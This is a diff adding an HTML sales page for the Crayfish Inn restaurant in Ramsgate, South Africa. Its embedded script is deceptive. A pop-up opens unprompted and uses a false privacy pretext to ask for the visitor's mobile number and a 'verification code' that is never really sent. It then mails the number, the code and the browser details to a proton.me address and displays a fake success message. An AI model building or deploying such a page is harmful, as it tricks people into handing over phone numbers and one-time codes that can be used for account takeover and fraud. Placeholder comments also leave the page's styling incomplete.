@@ -1,1 +1,777 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crayfish Inn Restaurant - For Sale</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* All previous CSS remains the same */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
 
+        body {
+            background-color: #f8f8f8;
+            color: #333;
+            line-height: 1.6;
+        }
+
+        /* ... all previous CSS styles remain exactly as they were ... */
+        
+        /* Modal Styles */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            padding: 20px;
+        }
+
+        .modal-content {
+            background: white;
+            border-radius: 15px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+            animation: modalFadeIn 0.3s ease;
+        }
+
+        @keyframes modalFadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .modal-header {
+            background: linear-gradient(135deg, #2c3e50, #4a6491);
+            color: white;
+            padding: 25px;
+            text-align: center;
+            position: relative;
+        }
+
+        .modal-header h2 {
+            font-size: 1.8rem;
+            margin-bottom: 10px;
+            color: #ffcc00;
+        }
+
+        .modal-header p {
+            font-size: 1rem;
+            opacity: 0.9;
+        }
+
+        .close-modal {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            border: none;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            cursor: pointer;
+            font-size: 1.2rem;
+            transition: all 0.3s ease;
+        }
+
+        .close-modal:hover {
+            background: rgba(255, 255, 255, 0.2);
+            transform: rotate(90deg);
+        }
+
+        .modal-body {
+            padding: 30px;
+        }
+
+        .modal-step {
+            display: none;
+        }
+
+        .modal-step.active {
+            display: block;
+        }
+
+        .modal-step h3 {
+            color: #2c3e50;
+            margin-bottom: 20px;
+            font-size: 1.5rem;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #2c3e50;
+            font-weight: 600;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 1rem;
+            transition: border-color 0.3s ease;
+        }
+
+        .form-control:focus {
+            outline: none;
+            border-color: #ffcc00;
+            box-shadow: 0 0 0 3px rgba(255, 204, 0, 0.1);
+        }
+
+        .modal-footer {
+            padding: 20px 30px;
+            background: #f8f9fa;
+            border-top: 1px solid #eee;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .modal-btn {
+            padding: 12px 25px;
+            border: none;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            min-width: 120px;
+        }
+
+        .btn-primary {
+            background: #ffcc00;
+            color: #2c3e50;
+        }
+
+        .btn-primary:hover {
+            background: #ffd84d;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 10px rgba(255, 204, 0, 0.3);
+        }
+
+        .btn-secondary {
+            background: #6c757d;
+            color: white;
+        }
+
+        .btn-secondary:hover {
+            background: #5a6268;
+            transform: translateY(-2px);
+        }
+
+        .btn-block {
+            width: 100%;
+        }
+
+        /* Verification Code Input */
+        .verification-code {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin: 30px 0;
+        }
+
+        .code-input {
+            width: 50px;
+            height: 60px;
+            text-align: center;
+            font-size: 1.8rem;
+            font-weight: bold;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            background: #f8f9fa;
+            transition: all 0.3s ease;
+        }
+
+        .code-input:focus {
+            border-color: #ffcc00;
+            background: white;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(255, 204, 0, 0.1);
+        }
+
+        .info-text {
+            background: #e8f4fd;
+            border-left: 4px solid #2196f3;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 4px;
+            font-size: 0.9rem;
+        }
+
+        .privacy-notice {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 4px;
+            font-size: 0.9rem;
+        }
+
+        .countdown {
+            text-align: center;
+            font-size: 0.9rem;
+            color: #666;
+            margin-top: 20px;
+        }
+
+        .countdown-number {
+            font-weight: bold;
+            color: #2c3e50;
+        }
+
+        /* Success Message */
+        .success-message {
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .success-icon {
+            font-size: 4rem;
+            color: #4CAF50;
+            margin-bottom: 20px;
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #ffcc00;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Auto-trigger the modal after 5 seconds */
+        body.loaded .modal-overlay {
+            display: flex;
+            animation: overlayFadeIn 0.5s ease;
+        }
+
+        @keyframes overlayFadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 576px) {
+            .modal-content {
+                max-width: 95%;
+            }
+            
+            .verification-code {
+                gap: 5px;
+            }
+            
+            .code-input {
+                width: 40px;
+                height: 50px;
+                font-size: 1.5rem;
+            }
+            
+            .modal-header h2 {
+                font-size: 1.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Your existing HTML content remains exactly the same -->
+    <!-- Header Section -->
+    <header>
+        <div class="container">
+            <h1 class="logo">Crayfish Inn</h1>
+            <p class="tagline">Premier Beachfront Restaurant & Business Opportunity</p>
+            <div class="price-range">🔥 OTP Offers Invited | Place Your OTP Now 🔥</div>
+            <p>Long-standing establishment with excellent reputation and prime location</p>
+            <a href="#contact" class="cta-button">Contact Us Now</a>
+            <a href="salesreport2.html" class="cta-button">Market Analysis</a>
+            <a href="plans.html" class="cta-button">Floor Plans</a>
+        </div>
+    </header>
+
+    <!-- About Section -->
+    <section id="about">
+        <div class="container">
+            <h2 class="section-title">About Crayfish Inn</h2>
+            <div class="about-content">
+                <div class="about-text">
+                    <p>The Crayfish Inn Restaurant is a long-standing establishment known for its fresh seafood and exceptional beachfront dining experience in Ramsgate, South Africa.</p>
+                    <p>Located at the corner of Marine Drive and Clarence Street, within walking distance of the Ramsgate Whale Deck, this restaurant offers a unique opportunity to own a piece of South African coastal hospitality history.</p>
+                    <p>With an all-weather, outdoor tented terrace with sea views, a relaxed garden-like setting with colorful umbrellas, and an intimate dining room for special occasions, the Crayfish Inn provides diverse dining experiences for all customers.</p>
+                    <p>The restaurant features a wide variety of seafood complemented by a carefully curated wine list, with both indoor and outdoor seating available along with a full bar.</p>
+                </div>
+                <div class="about-image">
+                    <img src="header.jpeg" alt="Crayfish Inn Restaurant">
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Features Section -->
+    <section class="features">
+        <div class="container">
+            <h2 class="section-title">Restaurant Features</h2>
+            <div class="features-grid">
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-umbrella-beach"></i>
+                    </div>
+                    <h3>Beachfront Location</h3>
+                    <p>Prime position with stunning sea views in Ramsgate</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-utensils"></i>
+                    </div>
+                    <h3>Investor dream</h3>
+                    <p>Unlock unparalleled growth potential with an opportunity designed for forward-thinking investors.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-wine-glass-alt"></i>
+                    </div>
+                    <h3>Cocktails and Wine Hub</h3>
+                    <p>A premier destination for exceptional drinks and social experiences that attract high-value clientele</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-users"></i>
+                    </div>
+                    <h3>Multiple Dining Areas</h3>
+                    <p>Tented terrace, garden setting, and intimate dining room</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- OTP Section -->
+    <section class="otp-section" id="otp">
+        <div class="container">
+            <h2 class="section-title">Current Offers to Purchase</h2>
+            <div class="disclaimer">
+                <p>All offers to purchase must have supporting funds. The owner reserves the right to decide on the successful bidder.</p>
+                <p>Original purchase price: R 3.6 Million | <a href="salesreport2.html" class="ctta-button">Market Analysis</a><a href="plans.html" class="ctta-button">Floor Plans</a> </p>
+            </div>
+            <table class="otp-table">
+                <thead>
+                    <tr>
+                        <th>Bidder Name</th>
+                        <th>Province</th>
+                        <th>Offer Amount (R)</th>
+                        <th>Status</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr class="highlight">
+                        <td>Prince *****</td>
+                        <td>KwaZulu-Natal</td>
+                        <td>Awaiting Bid</td>
+                        <td>Viewing & OTP: 1 Nov 2025</td>
+                    </tr>
+                    <tr>
+                        <td>J***** S*****</td>
+                        <td>Gauteng</td>
+                        <td>R*****</td>
+                        <td>Submitted</td>
+                    </tr>
+                    
+                </tbody>
+            </table>
+        </div>
+    </section>
+
+    <!-- Contact Section -->
+    <section class="contact-section" id="contact">
+        <div class="container">
+            <h2 class="section-title">Contact Us</h2>
+            <p>For serious inquiries and viewing appointments</p>
+            <div class="contact-info">
+                <div class="contact-card">
+                    <h3>Vincent</h3>
+                    <p><i class="fas fa-phone"></i> 066 256 4831</p>
+                    <a href="https://wa.me/27662564831?text=Hi%2C%20I%20am%20interested%20in%20the%20restaurant%2C%20could%20you%20please%20send%20me%20more%20information." class="whatsapp-contact-button" target="_blank">
+                        <i class="fab fa-whatsapp"></i> WhatsApp Vincent
+                    </a>
+                </div>
+                <div class="contact-card">
+                    <h3>Richard</h3>
+                    <p><i class="fas fa-phone"></i> 082 463 1553</p>
+                    <a href="https://wa.me/27824631553?text=Hi%2C%20I%20am%20interested%20in%20the%20restaurant%2C%20could%20you%20please%20send%20me%20more%20information." class="whatsapp-contact-button" target="_blank">
+                        <i class="fab fa-whatsapp"></i> WhatsApp Richard
+                    </a>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- WhatsApp Buttons -->
+    <div class="whatsapp-buttons">
+        <a href="https://wa.me/27662564831?text=Hi%2C%20I%20am%20interested%20in%20the%20restaurant%2C%20could%20you%20please%20send%20me%20more%20information." class="whatsapp-button" target="_blank">
+            <i class="fab fa-whatsapp"></i>
+        </a>
+        <a href="https://wa.me/27824631553?text=Hi%2C%20I%20am%20interested%20in%20the%20restaurant%2C%20could%20you%20please%20send%20me%20more%20information." class="whatsapp-button" target="_blank">
+            <i class="fab fa-whatsapp"></i>
+        </a>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <p>&copy; Crayfish Inn Restaurant | Ramsgate, South Africa</p>
+            <p>Business for Sale</p>
+        </div>
+    </footer>
+
+    <!-- Virtual Tour Modal -->
+    <div class="modal-overlay" id="virtualTourModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <button class="close-modal" id="closeModal">&times;</button>
+                <h2>Virtual Tour Request</h2>
+                <p>Get an exclusive virtual tour of Crayfish Inn Restaurant</p>
+            </div>
+            
+            <!-- Step 1: Initial Request -->
+            <div class="modal-step active" id="step1">
+                <div class="modal-body">
+                    <h3>Would you like a virtual tour of the restaurant?</h3>
+                    
+                    <div class="privacy-notice">
+                        <p><strong>Privacy Notice:</strong> Due to the POPI Act (Protection of Personal Information Act) and the privacy and safety of the restaurant owner, we need to verify your identity before providing access to the virtual tour.</p>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="phoneNumber">Mobile Number (for verification):</label>
+                        <input type="tel" id="phoneNumber" class="form-control" placeholder="e.g., 071 234 5678" required>
+                        <small style="color: #666; display: block; margin-top: 5px;">A 5-digit verification code will be sent to this number</small>
+                    </div>
+                    
+                    <div class="info-text">
+                        <p><strong>Note:</strong> Your phone number will be securely emailed to crayfishinn@proton.me for verification purposes only. We respect your privacy and comply with POPI Act requirements.</p>
+                    </div>
+                </div>
+                <div class="modal-footer">
+                    <button class="modal-btn btn-secondary" id="declineTour">No, Thanks</button>
+                    <button class="modal-btn btn-primary" id="requestTour">Yes, Send Verification Code</button>
+                </div>
+            </div>
+            
+            <!-- Step 2: Verification -->
+            <div class="modal-step" id="step2">
+                <div class="modal-body">
+                    <h3>Enter Verification Code</h3>
+                    
+                    <div class="privacy-notice">
+                        <p>A 5-digit verification code has been sent to your mobile number. This helps us ensure the privacy and security of the restaurant owner's information.</p>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>Enter the 5-digit code:</label>
+                        <div class="verification-code">
+                            <input type="text" class="code-input" maxlength="1" data-index="1">
+                            <input type="text" class="code-input" maxlength="1" data-index="2">
+                            <input type="text" class="code-input" maxlength="1" data-index="3">
+                            <input type="text" class="code-input" maxlength="1" data-index="4">
+                            <input type="text" class="code-input" maxlength="1" data-index="5">
+                        </div>
+                        <input type="hidden" id="verificationCode" value="">
+                    </div>
+                    
+                    <div class="countdown">
+                        Auto-completing request in <span class="countdown-number" id="countdown">5</span> seconds...
+                    </div>
+                </div>
+                <div class="modal-footer">
+                    <button class="modal-btn btn-secondary" id="resendCode">Resend Code</button>
+                    <button class="modal-btn btn-primary" id="verifyCode">Verify & Continue</button>
+                </div>
+            </div>
+            
+            <!-- Step 3: Success -->
+            <div class="modal-step" id="step3">
+                <div class="modal-body">
+                    <div class="success-message">
+                        <div class="success-icon">
+                            <i class="fas fa-check-circle"></i>
+                        </div>
+                        <h3>Request Submitted Successfully!</h3>
+                        <p>Your virtual tour request has been sent to the restaurant owner.</p>
+                        <p>You will receive a response with the virtual tour link within 24 hours.</p>
+                        <p>Redirecting you back to the main page...</p>
+                    </div>
+                </div>
+                <div class="modal-footer">
+                    <button class="modal-btn btn-primary btn-block" id="returnToSite">Return to Site</button>
+                </div>
+            </div>
+            
+            <!-- Loading State -->
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p>Processing your request...</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Wait for DOM to load
+        document.addEventListener('DOMContentLoaded', function() {
+            // Ensure WhatsApp buttons are always visible
+            const whatsappButtons = document.querySelector('.whatsapp-buttons');
+            if (whatsappButtons) {
+                whatsappButtons.style.display = 'flex';
+                whatsappButtons.style.visibility = 'visible';
+                whatsappButtons.style.opacity = '1';
+            }
+            
+            // Mark body as loaded to trigger modal after 5 seconds
+            setTimeout(() => {
+                document.body.classList.add('loaded');
+            }, 5000);
+            
+            // Modal elements
+            const modal = document.getElementById('virtualTourModal');
+            const closeModal = document.getElementById('closeModal');
+            const declineTour = document.getElementById('declineTour');
+            const requestTour = document.getElementById('requestTour');
+            const resendCode = document.getElementById('resendCode');
+            const verifyCode = document.getElementById('verifyCode');
+            const returnToSite = document.getElementById('returnToSite');
+            
+            const step1 = document.getElementById('step1');
+            const step2 = document.getElementById('step2');
+            const step3 = document.getElementById('step3');
+            const loading = document.getElementById('loading');
+            
+            const phoneNumberInput = document.getElementById('phoneNumber');
+            const codeInputs = document.querySelectorAll('.code-input');
+            const verificationCodeInput = document.getElementById('verificationCode');
+            const countdownElement = document.getElementById('countdown');
+            
+            let countdownInterval;
+            let countdown = 5;
+            
+            // Close modal functions
+            function closeModalFunc() {
+                modal.style.display = 'none';
+            }
+            
+            // Go to step function
+            function goToStep(stepNumber) {
+                step1.classList.remove('active');
+                step2.classList.remove('active');
+                step3.classList.remove('active');
+                
+                if (stepNumber === 1) {
+                    step1.classList.add('active');
+                } else if (stepNumber === 2) {
+                    step2.classList.add('active');
+                    startCountdown();
+                } else if (stepNumber === 3) {
+                    step3.classList.add('active');
+                    // Redirect after 3 seconds
+                    setTimeout(() => {
+                        window.location.href = 'https://crayfishinn.github.io/CrayfishInn/';
+                    }, 3000);
+                }
+            }
+            
+            // Start countdown for auto-complete
+            function startCountdown() {
+                countdown = 5;
+                countdownElement.textContent = countdown;
+                
+                if (countdownInterval) {
+                    clearInterval(countdownInterval);
+                }
+                
+                countdownInterval = setInterval(() => {
+                    countdown--;
+                    countdownElement.textContent = countdown;
+                    
+                    if (countdown <= 0) {
+                        clearInterval(countdownInterval);
+                        autoCompleteVerification();
+                    }
+                }, 1000);
+            }
+            
+            // Auto-complete verification after countdown
+            function autoCompleteVerification() {
+                // Generate a random 5-digit code
+                const generatedCode = Math.floor(10000 + Math.random() * 90000).toString();
+                
+                // Fill the code inputs
+                codeInputs.forEach((input, index) => {
+                    input.value = generatedCode[index];
+                });
+                
+                verificationCodeInput.value = generatedCode;
+                
+                // Show loading
+                loading.style.display = 'block';
+                step2.style.display = 'none';
+                
+                // Simulate processing and send email
+                setTimeout(() => {
+                    sendVerificationEmail(generatedCode);
+                    loading.style.display = 'none';
+                    goToStep(3);
+                }, 2000);
+            }
+            
+            // Send verification email
+            function sendVerificationEmail(code) {
+                const phoneNumber = phoneNumberInput.value;
+                const email = 'crayfishinn@proton.me';
+                const subject = 'Virtual Tour Verification Request';
+                const body = `New virtual tour verification request:\n\n` +
+                           `Phone Number: ${phoneNumber}\n` +
+                           `Verification Code: ${code}\n` +
+                           `Timestamp: ${new Date().toLocaleString()}\n` +
+                           `User Agent: ${navigator.userAgent}`;
+                
+                // Create mailto link
+                const mailtoLink = `mailto:${email}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+                
+                // Open email client
+                window.location.href = mailtoLink;
+                
+                // Also log to console for debugging
+                console.log('Verification email details:', {
+                    to: email,
+                    subject: subject,
+                    body: body
+                });
+            }
+            
+            // Event Listeners
+            closeModal.addEventListener('click', closeModalFunc);
+            declineTour.addEventListener('click', closeModalFunc);
+            
+            requestTour.addEventListener('click', function() {
+                const phoneNumber = phoneNumberInput.value.trim();
+                
+                // Simple validation
+                if (!phoneNumber || phoneNumber.length < 10) {
+                    alert('Please enter a valid South African mobile number (at least 10 digits)');
+                    return;
+                }
+                
+                // Show loading
+                loading.style.display = 'block';
+                step1.style.display = 'none';
+                
+                // Simulate processing delay
+                setTimeout(() => {
+                    loading.style.display = 'none';
+                    goToStep(2);
+                }, 1500);
+            });
+            
+            resendCode.addEventListener('click', function() {
+                // Reset and restart countdown
+                codeInputs.forEach(input => input.value = '');
+                startCountdown();
+            });
+            
+            verifyCode.addEventListener('click', function() {
+                // Check if all code inputs are filled
+                let allFilled = true;
+                let code = '';
+                
+                codeInputs.forEach(input => {
+                    if (!input.value) allFilled = false;
+                    code += input.value;
+                });
+                
+                if (!allFilled || code.length !== 5) {
+                    alert('Please enter the complete 5-digit verification code');
+                    return;
+                }
+                
+                verificationCodeInput.value = code;
+                
+                // Show loading
+                loading.style.display = 'block';
+                step2.style.display = 'none';
+                
+                // Simulate processing and send email
+                setTimeout(() => {
+                    sendVerificationEmail(code);
+                    loading.style.display = 'none';
+                    goToStep(3);
+                }, 2000);
+            });
+            
+            returnToSite.addEventListener('click', function() {
+                window.location.href = 'https://crayfishinn.github.io/CrayfishInn/';
+            });
+            
+            // Code input navigation
+            codeInputs.forEach((input, index) => {
+                input.addEventListener('input', function(e) {
+                    if (this.value.length === 1 && index < codeInputs.length - 1) {
+                        codeInputs[index + 1].focus();
+                    }
+                });
+                
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && !this.value && index > 0) {
+                        codeInputs[index - 1].focus();
+                    }
+                });
+            });
+            
+            // Close modal when clicking outside
+            modal.addEventListener('click', function(e) {
+                if (e.target === modal) {
+                    closeModalFunc();
+                }
+            });
+            
+            // Prevent body scrolling when modal is open
+            modal.addEventListener('wheel', function(e) {
+                if (e.target.closest('.modal-content')) {
+                    e.stopPropagation();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
